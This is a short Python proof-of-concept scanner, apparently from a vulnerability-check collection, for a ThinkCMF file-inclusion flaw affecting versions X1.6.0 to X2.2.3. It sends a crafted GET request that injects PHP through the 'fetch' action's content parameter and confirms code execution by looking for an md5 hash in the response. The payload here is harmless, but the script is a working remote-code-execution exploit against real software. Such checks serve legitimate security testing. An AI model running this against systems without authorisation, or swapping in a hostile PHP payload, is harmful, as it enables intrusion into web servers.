#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkCMF 任意文件包含漏洞
referer: https://blog.csdn.net/wwl012345/article/details/102792586
author: tanw923
description: ThinkCMF 版本
ThinkCMF X1.6.0
ThinkCMF X2.1.0
ThinkCMF X2.2.0
ThinkCMF X2.2.1
ThinkCMF X2.2.2
ThinkCMF X2.2.3
引起漏洞最主要的问题就是因为fetch函数和display函数是public类型
'''
import sys
import requests



class thinkcmf_file_contain_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/?a=fetch&templateFile=public/index&prefix=%27%27&content=%3Cphp%3Eecho%20md5(%22xxikevI5%22);die();%3C/php%3E"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"f2602cd2bdf3554f244b29d28628c163" in req.text:
                return "[+]存在ThinkCMF 文件包含漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = thinkcmf_file_contain_BaseVerify(sys.argv[1])
    testVuln.run()